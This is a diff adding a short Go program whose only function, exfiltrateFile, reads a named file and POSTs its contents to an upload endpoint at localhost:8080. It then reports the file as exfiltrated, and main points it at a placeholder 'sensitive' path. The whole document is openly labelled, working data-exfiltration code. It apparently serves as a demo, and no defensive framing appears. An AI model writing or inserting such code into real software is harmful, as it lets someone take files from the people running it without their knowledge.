@@ -1,0 +1,28 @@
+package main
+
+import (
+    "bytes"
+    "fmt"
+    "io/ioutil"
+    "net/http"
+)
+
+func exfiltrateFile(filename string) {
+    fileData, err := ioutil.ReadFile(filename)
+    if err != nil {
+        fmt.Println("File read error:", err)
+        return
+    }
+
+    resp, err := http.Post("http://localhost:8080/upload", "application/octet-stream", bytes.NewBuffer(fileData))
+    if err != nil {
+        fmt.Println("Exfiltration error:", err)
+        return
+    }
+    defer resp.Body.Close()
+    fmt.Println("File exfiltrated:", filename)
+}
+
+func main() {
+    exfiltrateFile("/path/to/sensitive/file")
+}
